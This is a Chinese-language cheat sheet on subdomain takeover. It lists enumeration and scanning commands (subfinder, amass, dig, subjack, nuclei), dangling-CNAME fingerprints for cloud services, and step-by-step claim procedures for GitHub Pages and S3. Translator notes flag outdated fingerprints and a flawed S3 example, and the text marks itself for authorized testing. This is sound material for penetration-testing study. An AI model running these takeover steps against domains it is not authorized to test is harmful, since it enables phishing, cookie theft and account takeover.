# 🎯 子域名接管速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███╗   ███╗ █████╗ ██╗███╗   ██╗
  ██╔════╝██║   ██║██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██║████╗  ██║
  ███████╗██║   ██║██████╔╝██║  ██║██║   ██║██╔████╔██║███████║██║██╔██╗ ██║
  ╚════██║██║   ██║██╔══██╗██║  ██║██║   ██║██║╚██╔╝██║██╔══██║██║██║╚██╗██║
  ███████║╚██████╔╝██████╔╝██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║██║ ╚████║
  ╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                ████████╗ █████╗ ██╗  ██╗███████╗ ██████╗ ██╗   ██╗███████╗██████╗ 
                ╚══██╔══╝██╔══██╗██║ ██╔╝██╔════╝██╔═══██╗██║   ██║██╔════╝██╔══██╗
                   ██║   ███████║█████╔╝ █████╗  ██║   ██║██║   ██║█████╗  ██████╔╝
                   ██║   ██╔══██║██╔═██╗ ██╔══╝  ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
                   ██║   ██║  ██║██║  ██╗███████╗╚██████╔╝ ╚████╔╝ ███████╗██║  ██║
                   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝
```

---

## 🎯 什么是子域名接管

**子域名接管（Subdomain takeover）**是指子域名通过 CNAME 指向已被删除的服务，而攻击者能够重新认领该服务，从而利用这个子域名提供恶意内容。

> **译注：**CNAME 指向已删除资源只是风险线索；本文指纹和认领步骤包含历史及简化示例，错误页不能单独证明资源可被重新认领。还需考虑各服务当前的域名验证与资源绑定机制。例如，[CloudFront](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/CNAMEs.html)要求新备用域名由有效 TLS 证书覆盖；[GitHub Pages](https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/verifying-your-custom-domain-for-github-pages)的域名验证可阻止其他用户绑定已验证域名；[Azure](https://learn.microsoft.com/en-us/azure/security/fundamentals/subdomain-takeover)也提供服务特定的防护措施。

### 影响
- 🔴 **网络钓鱼** — 托管具有迷惑性的钓鱼页面
- 🔴 **Cookie 窃取** — 窃取父域设置的 Cookie
- 🔴 **账户接管** — 截获 OAuth 回调
- 🔴 **声誉受损** — 提供恶意内容

---

> **译注：**Cookie 影响取决于其作用域；父域的 host-only Cookie 不会自动发送给子域，参见 [Cookie 的 Domain 属性](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#domain)。

## 🔍 检测方法

### 第 1 步：枚举子域名
```bash
# 结合多种工具以提高覆盖率
subfinder -d target.com -o subs.txt
amass enum -d target.com -o amass.txt
assetfinder --subs-only target.com >> subs.txt

# 合并并去重
cat subs.txt amass.txt | sort -u > all_subs.txt
```

### 第 2 步：查找 CNAME 记录
```bash
# 检查 DNS 记录
cat all_subs.txt | while read sub; do
    cname=$(dig CNAME +short $sub)
    if [ ! -z "$cname" ]; then
        echo "$sub -> $cname"
    fi
done

# 或使用 dnsrecon
dnsrecon -d target.com -t crt
```

> **译注：**上面的 `dnsrecon -t crt` 使用证书透明度来源发现名称，并不等同于逐项查询当前 CNAME；仍需验证实际 DNS 记录。参见 [DNSRecon 源码](https://github.com/darkoperator/dnsrecon/blob/master/dnsrecon/cli.py)。

### 第 3 步：检查悬空 CNAME 记录
```bash
# 手动检查
dig CNAME subdomain.target.com +short
# 返回：something.cloudfront.net
# 然后检查该服务是否尚未被认领

# 使用 httpx 获取状态码
cat all_subs.txt | httpx -status-code -title -tech-detect -no-color
```

---

## 🛠️ 自动化工具

### Subjack
```bash
# 安装
go install github.com/haccer/subjack@latest

# 扫描
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl

# 使用指纹
subjack -w subdomains.txt -t 100 -a -timeout 30 -o results.txt -ssl
```

### Nuclei（接管检测模板）
```bash
# 使用 nuclei 模板
nuclei -l subdomains.txt -t ~/nuclei-templates/takeovers/ -o takeovers.txt

# 特定接管风险检查
nuclei -l subdomains.txt -t ~/nuclei-templates/takeovers/subdomain-takeover.yaml
```

### Can-I-Take-Over-XYZ
```bash
# 在 GitHub 仓库中查看指纹
# https://github.com/EdOverflow/can-i-take-over-xyz

# 手动使用这些指纹，或结合自动化工具使用
```

---

## 📋 存在风险的服务及其指纹

### AWS S3
```
CNAME: bucket.s3.amazonaws.com
CNAME: bucket.s3-website-region.amazonaws.com

指纹："NoSuchBucket"
指纹："The specified bucket does not exist"

接管方式：创建同名存储桶
```

### AWS CloudFront
```
CNAME: xxxxx.cloudfront.net

指纹："Bad Request"
指纹："ERROR: The request could not be satisfied"

接管方式：创建使用同一备用域名的 CloudFront 分配
```

### GitHub Pages
```
CNAME: username.github.io
CNAME: organization.github.io

指纹："There isn't a GitHub Pages site here"

接管方式：
1. 创建仓库 username.github.io
2. 添加 CNAME 文件，写入目标子域名
```

### Heroku
```
CNAME: xxx.herokuapp.com
CNAME: xxx.herokudns.com

指纹："No such app"
指纹："There's nothing here, yet"

接管方式：创建同名 Heroku 应用
```

### Azure
```
CNAME: xxx.azurewebsites.net
CNAME: xxx.cloudapp.azure.com
CNAME: xxx.blob.core.windows.net

指纹："404 - Web Site not found"

接管方式：创建同名资源
```

### Shopify
```
CNAME: shops.myshopify.com

指纹："Sorry, this shop is currently unavailable"
指纹："Only one step left"

接管方式：创建 Shopify 商店并添加自定义域名
```

### WordPress.com
```
CNAME: xxx.wordpress.com

指纹："Do you want to register *.wordpress.com?"

接管方式：在 WordPress.com 注册该子域名
```

### Zendesk
```
CNAME: xxx.zendesk.com

指纹："Help Center Closed"
指纹："This help center no longer exists"

接管方式：并非总能实现，取决于 Zendesk 配置
```

### Fastly
```
CNAME: xxx.fastly.net

指纹："Fastly error: unknown domain"

接管方式：将域名添加到 Fastly 服务
```

### Pantheon
```
CNAME: xxx.pantheonsite.io

指纹："The gods are wise but do not know of the site"
指纹："404 error unknown site!"

接管方式：在 Pantheon 添加站点
```

---

## 🔥 利用步骤

### 示例：GitHub Pages 接管

```bash
# 1. 查找存在风险的子域名
dig CNAME blog.target.com
# 返回：target.github.io（但对应仓库不存在）

# 2. 创建 GitHub 仓库
# 创建：yourusername/target（或 org/target）

# 3. 在仓库设置中启用 GitHub Pages

# 4. 添加 CNAME 文件，内容如下：
blog.target.com

# 5. 等待 DNS 变更传播

# 6. 验证接管结果
curl https://blog.target.com
```

### 示例：S3 接管

> **译注：**下方示例将 `assets.target.com` 指向 `assets-target.s3.amazonaws.com`，却创建 `assets-target` 存储桶。按 [S3 自定义 CNAME 的 Host 匹配规则](https://docs.aws.amazon.com/AmazonS3/latest/userguide/VirtualHosting.html)，直接使用自定义主机名时，桶名应与该主机名一致；因此原示例不能保证最终请求成功。公开访问、区域及网站端点设置也会影响结果。原命令保留供对照。

```bash
# 1. 确认漏洞
dig CNAME assets.target.com
# 返回：assets-target.s3.amazonaws.com

curl http://assets-target.s3.amazonaws.com
# 返回：NoSuchBucket

# 2. 创建 S3 存储桶（同一区域）
aws s3 mb s3://assets-target --region us-east-1

# 3. 配置存储桶
# 添加网站托管或公开访问配置

# 4. 上传内容
echo "Subdomain Takeover PoC" > index.html
aws s3 cp index.html s3://assets-target/

# 5. 验证
curl http://assets.target.com
```

---

## 📊 快速参考

### 存在风险的服务检测

| 服务 | CNAME 模式 | 指纹 |
|---------|---------------|-------------|
| AWS S3 | `*.s3.amazonaws.com` | NoSuchBucket |
| CloudFront | `*.cloudfront.net` | Bad Request |
| GitHub | `*.github.io` | No GitHub Pages |
| Heroku | `*.herokuapp.com` | No such app |
| Azure | `*.azurewebsites.net` | 404 Web Site not found |
| Shopify | `shops.myshopify.com` | Shop unavailable |

### 接管检查清单

```markdown
- [ ] 枚举所有子域名
- [ ] 识别 CNAME 记录
- [ ] 检查悬空记录
- [ ] 匹配指纹
- [ ] 验证服务是否尚未被认领
- [ ] 在授权范围内尝试接管
- [ ] 记录并报告
```

---

## 🛠️ 工具汇总

| 工具 | 用途 |
|------|---------|
| **subjack** | 自动检测接管风险 |
| **nuclei** | 基于模板的扫描 |
| **can-i-take-over-xyz** | 指纹参考 |
| **dnsrecon** | DNS 枚举 |
| **subfinder** | 子域名发现 |
| **httpx** | HTTP 探测 |

---

## 📚 参考资料

- [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz)
- [Subjack](https://github.com/haccer/subjack)
- [Nuclei 接管检测模板](https://github.com/projectdiscovery/nuclei-templates/tree/main/takeovers)

---

<p align="center">
  <b>🎯 认领这些子域名！</b><br>
  <i>仅限经授权的测试！</i>
</p>
